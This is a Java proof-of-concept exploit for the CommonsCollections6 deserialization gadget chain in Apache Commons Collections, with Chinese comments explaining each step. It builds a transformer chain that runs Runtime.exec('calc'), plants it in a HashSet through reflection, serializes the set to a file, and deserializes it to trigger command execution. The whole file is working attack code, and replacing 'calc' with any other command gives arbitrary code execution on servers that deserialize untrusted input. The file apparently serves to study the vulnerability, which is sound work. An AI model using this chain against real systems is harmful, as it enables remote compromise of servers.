import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6Method2 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

        /*
         * 客户端构造payload，并序列化文件
         * */

        //这是真的transformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("1","2");
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"leihehe");//让TiedMapEntry里的map为lazyMap,key随意

        //创建HashSet的时候，其内部已经创建了一个hashmap，我们只需要把这个内部生成的hashmap的key值改为tiedMapEntry，当他被call put的时候，利用链就成功执行了。

        HashSet hashSet = new HashSet();
        hashSet.add("111");//先随意给内部的map添加一个key
        Field map = hashSet.getClass().getDeclaredField("map");//得到这个map Field
        map.setAccessible(true);
        HashMap mapInHashSet = (HashMap) map.get(hashSet);//得到这个map的内容 -》也就是hashMap

        Field table = mapInHashSet.getClass().getDeclaredField("table");//从这个hashmap中获取table field
        table.setAccessible(true);
        Object[] array = (Object[]) table.get(mapInHashSet);//这个table field里面包含了由各种键值对组成的数组
        // 我们的目的是修改那个我们之前放进去的key值，让他等于tiedMapEntry

        Object node = array[0];
        for (Object i : array){//遍历这个键值对数组，如果不为空，就赋值给node，从而得到一对键值对
            if(i!=null){
                node=i;
                break;
            }
        }
        /* 修改其中的key值 */
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedMapEntry);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("lz.cer");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashSet);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream("lz.cer");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    }
}
